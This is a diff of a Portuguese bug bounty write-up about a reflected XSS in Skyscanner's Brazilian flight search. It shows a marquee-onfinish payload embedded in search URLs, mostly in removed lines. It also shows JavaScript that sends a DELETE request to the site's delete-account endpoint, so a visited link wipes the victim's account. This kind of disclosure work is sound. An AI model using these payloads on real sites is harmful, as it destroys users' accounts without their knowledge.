@@ -11,10 +11,8 @@ Salve rapaziada, no post de hoje irei falar sobre uma vulnerabilidade que encont
 
 <p align="justify">
 Enquanto navegava pela aplicação, notei que ao fazer uma busca, haviam vários parâmetros sendo passados pelo método GET, similar a este resultado:
-</p>
-
-<p align="justify">
-<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/kef/190615/190622/?adults=1&children=0&adultsv2=1&childrenv2=&infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home#results</code>
+<br>
+<img src="/images/bug_bounty/bb03/bb03-00.png"/>
 <br>
 </p>
 
@@ -23,13 +21,11 @@ Dei uma no código fonte e vi que o a URL não era refletida no código fonte da
 <br>
 <br>
 Depois de pesquisar um pouco mais, notei que ao realizar uma busca por locais que não haviam viagens a URL era refletida no código. Utilizei o seguinte link para encontrar essa funcionalidade:
-</p>
-
-<p align="justify">
-<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home&ampcurrency=BOB</code>
+<br>
+<img src="/images/bug_bounty/bb03/bb03-01.png"/>
 <br>
 <br>
-<img src="/images/bug_bounty/bb03/bb03-00.png"/>
+<img src="/images/bug_bounty/bb03/bb03-02.png"/>
 </p>
 
 <p align="justify">
@@ -57,7 +53,7 @@ Pesquisando um pouco mais sobre como utilizar a tag marquee, notei que ela supor
 Então, quando o marquee era finalizado, podíamos executar códigos Javascript. Infelizmente também esqueci de tirar print dessa parte :(
 <br>
 <br>
-Dependendo do tamanho do painel que era criado, demoraria muito para o banner finalizar. Então adicionei outros 2 atributos ao nosso marquee: <i>width</i> e <i>loop</i>, que servem para você definir o tamanho e o número de vezes que você quer que o banner apareça.
+Dependendo do tamanho do painel criado pelo marquee, demoraria muito para o banner finalizar. Então adicionei outros 2 atributos ao nosso marquee: <i>width</i> e <i>loop</i>, que servem para você definir o tamanho e o número de vezes que você quer que o banner apareça.
 </p>
 
 <p align="justify">
@@ -70,7 +66,7 @@ Bom, nesse ponto nosso payload estava da seguinte forma:
 <p align="justify">
 Agora, o link junto com o payload ficaria da seguinte forma:
 <br>
-<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home">&lt;marquee width=0 loop=1 onfinish="alert(1)">rapt00r&lt;/marquee>&ampcurrency=BOB</code>
+<img src="/images/bug_bounty/bb03/bb03-03.png"/>
 </p>
 
 <p align="justify">
@@ -92,15 +88,14 @@ Para realizar a exclusão da conta era necessário enviar uma request (necessár
 Para finalizar, irei deixar o código da requisição que utilizei no evento JS para realizar a exclusão da conta do usuário que visitasse o link:
 </p>
 
-<code>var request = new XMLHttpRequest();
-request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-account', false); 
+<code>var request = new XMLHttpRequest(); <br>
+request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-account', false); <br>
 request.send();</code>
 
 <p align="justify">
 E o link final para explorar a vulnerabilidade ficou da seguinte forma:
-</p>
-<p align="justify">
-<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=https://www.google.com"/> &lt;marquee loop=1 width=0 onfinish="var request = new XMLHttpRequest(); request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-account', false); request.send();">&lt;/marquee>&ampcurrency=BOB</code>
+<br>
+<img src="/images/bug_bounty/bb03/bb03-04.png"/>
 </p>
 
 <p align="justify">
